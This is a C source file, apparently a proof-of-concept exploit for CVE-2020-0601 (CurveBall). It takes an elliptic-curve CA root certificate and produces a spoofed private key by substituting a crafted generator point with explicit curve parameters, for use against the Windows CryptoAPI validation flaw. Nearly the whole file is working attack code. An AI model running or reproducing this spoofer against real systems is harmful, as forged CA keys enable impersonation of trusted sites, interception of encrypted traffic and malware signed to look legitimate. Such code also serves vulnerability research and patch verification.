/*
 * CVE-2020-0601 - CurveBall PoC
 * Adam Podlosky <apodlosky@gmail.com>
 */

#include <assert.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <getopt.h>
#include <openssl/bio.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/x509.h>

#define DEFAULT_OUTPUT "spoof_ca.key"

static char* inputFile = NULL;
static char* outputFile = NULL;
static BIGNUM* optPrivateKey = NULL;
static bool optVerbose = false;

//
// Displays application usage.
//
void showUsage(const char *argv0)
{
    fprintf(stderr,
        "Usage: %s [-d <#>] [-v] <input> [output]\n"
        "\n"
        "Parameters:\n"
        "    -d <#>  - Specifiy private key value (decimal), defaults to 1\n"
        "    -v      - Verbose output\n"
        "   <input>  - Input CA root certificate\n"
        "   [output] - Output spoof certificate, defaults to " DEFAULT_OUTPUT "\n"
        "\n",
        argv0);
}

//
// Parses command-line arguments.
//
bool parseArgs(int argc, char *argv[])
{
    int opt;

    // Disable getopt warnings
    opterr = 0;

    while ((opt = getopt(argc, argv, "d:v")) != -1) {
        switch (opt) {
        case 'd':
            if (!BN_dec2bn(&optPrivateKey, optarg)) {
                fprintf(stderr, "error converting '%s': \n", optarg);
                ERR_print_errors_fp(stderr);
                return false;
            }
            break;
        case 'v':
            optVerbose = true;
            break;
        default:
            fprintf(stderr, "invalid parameter '-%c'\n", optopt);
            return false;
        }
    }

    switch (argc - optind) {
    case 1:
        inputFile = strdup(argv[optind]);
        outputFile = strdup(DEFAULT_OUTPUT);
        return true;
    case 2:
        inputFile = strdup(argv[optind]);
        outputFile = strdup(argv[optind + 1]);
        return true;
    default:
        return false;
    }
}

//
// Displays an OpenSSL error with the specified message prefix.
//
void showSslError(const char *prefix)
{
    printf("[!] Error, %s: ", prefix);
    ERR_print_errors_fp(stdout);
}

//
// Prints an OpenSSL BIGNUM to stdout.
//
void printBigNum(const BIGNUM* value)
{
    char *conv;

    // BN_print_fp() displays in hexidecimal
    conv = BN_bn2dec(value);
    if (conv == NULL) {
        fputs("(null)", stdout);
    } else {
        fputs(conv, stdout);
        OPENSSL_free(conv);
    }
}

//
// Prints an OpenSSL EC_POINT to stdout.
//
void printEcPoint(const EC_GROUP *group, const EC_POINT *point)
{
    BN_CTX *bnCtx = NULL;
    BIGNUM *bnX = NULL;
    BIGNUM *bnY = NULL;

    bnCtx = BN_CTX_new();
    if (bnCtx == NULL) {
        showSslError("BN_CTX_new failed");
        return;
    }
    BN_CTX_start(bnCtx);

    bnX = BN_CTX_get(bnCtx);
    bnY = BN_CTX_get(bnCtx);
    if (bnX == NULL || bnY == NULL) {
        showSslError("BN_CTX_get failed");
        goto cleanUp;
    }

    if (!EC_POINT_get_affine_coordinates_GFp(group, point, bnX, bnY, bnCtx)) {
        showSslError("EC_POINT_get_affine_coordinates_GFp failed");
        goto cleanUp;
    }

    putchar('(');
    printBigNum(bnX);
    putchar(',');
    printBigNum(bnY);
    putchar(')');

cleanUp:
    if (bnCtx != NULL) {
        BN_CTX_end(bnCtx);
        BN_CTX_free(bnCtx);
    }
}

//
// Prints an OpenSSL EC_KEY key to stdout.
//
void printEcKey(const EC_KEY *ecKey)
{
    EC_KEY_print_fp(stdout, ecKey, 0);

    //ECParameters_print_fp(stdout, ecKey);
}

//
// Reads an X.509 certificate (PEM format) from the specified file.
// Note: The returned X509 pointer must be freed.
//
X509* readX509(const char *inputFile)
{
    X509 *cert = NULL;
    BIO *fileIo;

    fileIo = BIO_new(BIO_s_file());
    if (fileIo == NULL) {
        showSslError("BIO_new failed");
        return NULL;
    }

    if (!BIO_read_filename(fileIo, inputFile)) {
        showSslError("BIO_read_filename failed");
    }
    else {
        cert = PEM_read_bio_X509(fileIo, NULL, 0, NULL);
        if (cert == NULL) {
            showSslError("PEM_read_bio_X509 failed");
        }
    }

    BIO_free(fileIo);

    return cert;
}

//
// Determines if the given X509 certificate is ECC.
//
bool isX509Ec(X509 *cert)
{
    const EVP_PKEY *publicKey;

    publicKey = X509_get0_pubkey(cert);
    if (publicKey == NULL) {
        showSslError("X509_get0_pubkey failed");
    }
    else if (EVP_PKEY_id(publicKey) == EVP_PKEY_EC) {
        return true;
    }

    return false;
}

//
// Retrieves the public key from an X509 ECC certificate.
//
EC_KEY* getX509EcPublicKey(X509 *cert)
{
    EC_KEY *ecKey = NULL;
    EVP_PKEY *publicKey;

    publicKey = X509_get0_pubkey(cert);
    if (publicKey == NULL) {
        showSslError("X509_get0_pubkey failed");
    }
    else {
        ecKey = EVP_PKEY_get0_EC_KEY(publicKey);
        if (ecKey == NULL) {
            showSslError("EVP_PKEY_get0_EC_KEY failed");
        }
    }

    return ecKey;
}

//
// Determines if the given EC key uses GF(p).
//
bool isEcKeyGFp(EC_KEY *ecKey)
{
    const EC_GROUP *ecGroup;
    const EC_METHOD *ecMethod;
    const EC_METHOD *ecMethodGF2m;
    int fieldType;

    ecGroup = EC_KEY_get0_group(ecKey);
    if (ecGroup == NULL) {
        showSslError("EC_KEY_get0_group failed");
        return false;
    }

    ecMethod = EC_GROUP_method_of(ecGroup);
    if (ecMethod == NULL) {
        showSslError("EC_GROUP_method_of failed");
        return false;
    }

    fieldType = EC_METHOD_get_field_type(ecMethod);

    // Curve field must be a GFp based, NOT GF2m. Currently OpenSSL supports
    // 6 GFp methods, but only one GF2m method
    ecMethodGF2m = EC_GF2m_simple_method();

    return fieldType != EC_METHOD_get_field_type(ecMethodGF2m);
}

//
// Modifies the EC key using the trivial solution:
//  d' = 1
//  Q' = Q
//  G' = Q
//
bool setEcKeyOne(EC_KEY *ecKey)
{
    bool result = false;
    EC_GROUP *ecGroup = NULL;
    const EC_GROUP *ecOrigGroup;
    const EC_POINT *ptGenerator;
    const EC_POINT *ptPublicKey;
    const BIGNUM *bnOrder;
    const BIGNUM *bnCofactor;
    const BIGNUM *bnPrivateKey;

    printf("  [-] Duplicating EC key group...\n");
    ecOrigGroup = EC_KEY_get0_group(ecKey);
    if (ecOrigGroup == NULL) {
        showSslError("EC_KEY_get0_group failed");
        goto cleanUp;
    }
    ptPublicKey = EC_KEY_get0_public_key(ecKey);
    bnOrder = EC_GROUP_get0_order(ecOrigGroup);
    bnCofactor = EC_GROUP_get0_cofactor(ecOrigGroup);

    ecGroup = EC_GROUP_dup(ecOrigGroup);
    if (ecGroup == NULL) {
        showSslError("EC_GROUP_dup failed");
        goto cleanUp;
    }

    // So easy!
    bnPrivateKey = BN_value_one();
    ptGenerator = ptPublicKey;

    printf("  [-] Setting EC group to EXPLICIT...\n");
    EC_GROUP_set_asn1_flag(ecGroup, OPENSSL_EC_EXPLICIT_CURVE);

    printf("  [-] Setting EC group parameters...\n");
    if (!EC_GROUP_set_generator(ecGroup, ptGenerator, bnOrder, bnCofactor)) {
        showSslError("EC_GROUP_set_generator failed");
        goto cleanUp;
    }

    printf("  [-] Setting EC private key to: 1\n");
    if (!EC_KEY_set_private_key(ecKey, bnPrivateKey)) {
        showSslError("EC_KEY_set_private_key failed");
        goto cleanUp;
    }

    printf("  [-] Setting EC key to new group...\n");
    if (!EC_KEY_set_group(ecKey, ecGroup)) {
        showSslError("EC_KEY_set_group failed");
        goto cleanUp;
    }

    // Success!
    result = true;

cleanUp:
    if (ecGroup != NULL) {
        EC_GROUP_free(ecGroup);
    }

    return result;
}

//
// Modifies the EC key using the non-trivial solution:
//  d' = specified
//  Q' = Q
//  G' = d'^-1 * G
//
bool setEcKeyCustom(EC_KEY *ecKey, const BIGNUM *bnPrivateKey)
{
    bool result = false;
    const EC_GROUP *ecOrigGroup;
    const EC_POINT *ptPublicKey;
    const BIGNUM *bnOrder;
    const BIGNUM *bnCofactor;
    BN_CTX *bnCtx = NULL;
    BIGNUM *bnA = NULL;
    BIGNUM *bnB = NULL;
    BIGNUM *bnP = NULL;
    BIGNUM *bnTemp = NULL;
    EC_GROUP *ecGroup = NULL;
    EC_POINT *ptGenerator = NULL;

    bnCtx = BN_CTX_new();
    if (bnCtx == NULL) {
        showSslError("BN_CTX_new failed");
        return false;
    }
    BN_CTX_start(bnCtx);

    bnA = BN_CTX_get(bnCtx);
    bnB = BN_CTX_get(bnCtx);
    bnP = BN_CTX_get(bnCtx);
    if (bnA == NULL || bnB == NULL || bnP == NULL) {
        showSslError("BN_CTX_get failed");
        goto cleanUp;
    }

    printf("  [-] Retrieving parameters from EC group...\n");
    ecOrigGroup = EC_KEY_get0_group(ecKey);
    if (ecOrigGroup == NULL) {
        showSslError("EC_KEY_get0_group failed");
        goto cleanUp;
    }

    ptPublicKey = EC_KEY_get0_public_key(ecKey);

    if (!EC_GROUP_get_curve_GFp(ecOrigGroup, bnP, bnA, bnB, bnCtx)) {
        showSslError("EC_GROUP_get_curve_GFp failed");
        goto cleanUp;
    }

    bnOrder = EC_GROUP_get0_order(ecOrigGroup);
    bnCofactor = EC_GROUP_get0_cofactor(ecOrigGroup);

    printf("  [-] Creating new EC group over GF(p)...\n");
    ecGroup = EC_GROUP_new_curve_GFp(bnP, bnA, bnB, bnCtx);
    if (ecGroup == NULL) {
        showSslError("EC_GROUP_new_curve_GFp failed");
        goto cleanUp;
    }

    EC_GROUP_set_asn1_flag(ecGroup, OPENSSL_EC_EXPLICIT_CURVE);

    printf("  [-] Calcuating generator point...\n");
    ptGenerator = EC_POINT_new(ecGroup);
    if (ptGenerator == NULL) {
        showSslError("EC_POINT_new failed");
        goto cleanUp;
    }

    //
    // Original:
    // params : (a,b,p,G,n,h) over GF(p)
    // pubkey : Q
    // privkey: d (not known)
    //
    // Spoof:
    // Q' = Q (per flaw)
    // d' = rand(), >1 and <n
    // G' = d'^-1 * G
    // (a',b',p',n',h') = (a,b,p,n,h)
    //
    // temp = 1/d' mod n (n = order of curve)
    // 'G = temp * Q
    //
    bnTemp = BN_mod_inverse(NULL, bnPrivateKey, bnOrder, bnCtx);
    if (bnTemp == NULL) {
        showSslError("BN_mod_inverse failed");
        goto cleanUp;
    }

    if (!EC_POINT_mul(ecGroup, ptGenerator, NULL, ptPublicKey, bnTemp, bnCtx)) {
        showSslError("EC_POINT_mul failed");
        goto cleanUp;
    }

    printf("  [-] Setting EC group generator to: ");
    printEcPoint(ecGroup, ptGenerator);
    putchar('\n');

    if (!EC_GROUP_set_generator(ecGroup, ptGenerator, bnOrder, bnCofactor)) {
        showSslError("EC_GROUP_set_generator failed");
        goto cleanUp;
    }

    printf("  [-] Setting EC private key to: ");
    printBigNum(bnPrivateKey);
    putchar('\n');

    if (!EC_KEY_set_private_key(ecKey, bnPrivateKey)) {
        showSslError("EC_KEY_set_private_key failed");
        goto cleanUp;
    }

    printf("  [-] Setting EC key to new group...\n");
    if (!EC_KEY_set_group(ecKey, ecGroup)) {
        showSslError("EC_KEY_set_group failed");
        goto cleanUp;
    }

    // Success!
    result = true;

cleanUp:
    if (ptGenerator != NULL) {
        EC_POINT_free(ptGenerator);
    }
    if (ecGroup != NULL) {
        EC_GROUP_free(ecGroup);
    }
    if (bnCtx != NULL) {
        BN_CTX_end(bnCtx);
        BN_CTX_free(bnCtx);
    }

    return result;
}

//
// Modifies the EC key per the CryptoAPI's certificate cache flaw.
//
bool modifyEcKey(EC_KEY *ecKey)
{
    if (optPrivateKey != NULL) {
        return setEcKeyCustom(ecKey, optPrivateKey);
    }
    return setEcKeyOne(ecKey);
}

//
// Verifies EC key parameters are valid.
//
bool verifyEcKey(EC_KEY *ecKey)
{
    // According to OpenSSL's great documentation:
    // 'EC_KEY_check_key() performs various sanity checks...' various you say?!
    if (!EC_KEY_check_key(ecKey)) {
        showSslError("EC_KEY_check_key failed");
        return false;
    }

    // TODO: more checks?

    return true;
}

//
// Writes an EC key to the specified file in PEM format.
//
bool writeEcKey(EC_KEY *ecKey, char *outputFile)
{
    bool result = false;
    BIO *fileIo;

    fileIo = BIO_new(BIO_s_file());
    if (fileIo == NULL) {
        showSslError("BIO_new failed");
        return false;
    }

    // BIO_write_filename() does not take a const char* for the path...
    if (!BIO_write_filename(fileIo, outputFile)) {
        showSslError("BIO_write_filename failed");
    }
    else {
        if (!PEM_write_bio_ECPrivateKey(fileIo, ecKey, NULL, NULL, 0, NULL, NULL)) {
            showSslError("PEM_write_bio_ECPrivateKey failed");
        }
        else {
            result = true;
        }
    }

    BIO_free(fileIo);

    return result;
}

int main(int argc, char *argv[])
{
    int result = EXIT_FAILURE;
    X509 *cert = NULL;
    EC_KEY *ecKey = NULL;

    if (!parseArgs(argc, argv)) {
        showUsage(argv[0]);
        exit(EXIT_FAILURE);
    }

    assert(inputFile);
    assert(outputFile);

    printf("[*] CA Spoofer for CVE-2020-0601 by Adam Podlosky\n");

    printf("[-] Reading input certificate '%s'...\n", inputFile);
    cert = readX509(inputFile);
    if (cert == NULL) {
        goto cleanUp;
    }

    printf("[-] Validating X.509 certificate...\n");
    if (!isX509Ec(cert)) {
        printf("[!] Error, NOT an EC public certificate\n");
        goto cleanUp;
    }

    printf("[-] Retrieving EC public key and parameters...\n");
    ecKey = getX509EcPublicKey(cert);
    if (ecKey == NULL) {
        goto cleanUp;
    }

    if (!isEcKeyGFp(ecKey)) {
        printf("[!] Error, NOT an EC certificate using GF(p) curve\n");
        goto cleanUp;
    }

    printf("[-] Modifying EC key per exploit..\n");
    if (!modifyEcKey(ecKey)) {
        goto cleanUp;
    }

    if (optVerbose) {
        printf("[-] Dumping EC key...\n");
        printEcKey(ecKey);
    }

    printf("[-] Verifying EC key...\n");
    if (!verifyEcKey(ecKey)) {
        goto cleanUp;
    }

    printf("[-] Writing output certificate '%s'...\n", outputFile);
    if (writeEcKey(ecKey, outputFile)) {
        printf("[*] Finished!\n");
        result = EXIT_SUCCESS;
    }

cleanUp:
    if (inputFile != NULL) {
        free(inputFile);
    }
    if (outputFile != NULL) {
        free(outputFile);
    }
    if (optPrivateKey != NULL) {
        BN_free(optPrivateKey);
    }
    if (cert != NULL) {
        X509_free(cert);
    }

    if (result != EXIT_SUCCESS) {
        printf("[*] Exiting with %d\n", result);
    }
    return result;
}
